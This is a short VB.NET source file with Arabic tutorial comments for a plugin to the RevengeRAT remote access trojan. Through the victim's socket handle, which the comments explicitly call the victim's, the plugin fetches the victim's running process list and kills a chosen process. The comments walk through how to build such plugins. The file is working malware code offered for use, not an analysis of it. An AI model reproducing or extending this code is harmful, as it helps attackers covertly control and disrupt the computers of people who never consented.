Public Class Form1
    Public Sock As Integer ' < هذا اهم شئ وهو المقبض المخصص للضحية والذي سنرسل منه وإليه البيانات ونستقبل عليها كذلك 
    Public Sub Send(ByVal Input As String, Ask As Boolean) ' فنكشن الأرسال وتكون بنفس الأسم لديكم ، الدالة تاخذ 2 Parmater 
        ' الأول للبيانات والثاني للسؤال ، سنشرحها علي حدي
        Reflection.Assembly.GetEntryAssembly.GetType("RevengeRAT.PLU").GetMethod("STP").Invoke(Nothing, New Object() {Sock, Input, Ask}) ' ضروري تكون الحروف كابتل وسمول مثل كذا
    End Sub
    ' نجهز فنكشن الأستقبال
    Sub Receive(ByVal Input) ' متغير من نوع اوبجيكت ، والأسم مثل كذا بالظبط
        ' نسوي سبلت للبيانات القادمة ، انا راح اسوي سبلت وبسوي استقبال مباشر بدون شروط ولا غيره لانه بيانات واحدة انت قسم مثل ما تحب
        Dim Spl As String() = Split(Input, "|") ' راح اقسم علي |
        For i = 0 To Spl.Length - 2
            ListView1.Items.Add(Spl(i)).SubItems.Add(Spl(i + 1))
            i += 1
        Next
    End Sub
    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        ListView1.Items.Clear()
        Send("ReProList", True) ' ليش استخدمنا هنا True ?? لاني راح اسال عن بيانات جديدة كتحديث قائمة العمليات
        ' true للبيانات اللي راح ترجع لنا ، False لجل ننفذ امر ما وراح نشرح تنفيذ امر
    End Sub
    Private Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click
        Send("Kill|" & ListView1.SelectedItems(0).SubItems(1).Text, False) ' هنا طلبنا ننفذ امر يعني راح نقتل العملية ، يعني الاوامر ما راح ترد لنا بس بتتنفذ داخل البلوقن
    End Sub
End Class